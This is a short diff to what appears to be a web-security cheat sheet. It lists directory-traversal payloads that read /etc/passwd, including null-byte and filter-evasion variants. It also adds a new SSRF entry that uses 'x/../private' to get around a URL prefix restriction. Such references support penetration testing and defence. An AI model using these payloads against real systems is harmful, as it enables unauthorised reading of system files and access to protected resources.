@@ -67,3 +67,6 @@ Files to aim which a Directory Traversal
     ../../../../etc/passwd%00
     ....//....//....//....//etc/passwd (Filter that replace ../ by empty string)
     <forced directory>../../../../etc/passwd (When a directory is forced, include it)
+
+## SSRF
+Bypass starting URL constraints (cannot start by /private) : x/../private
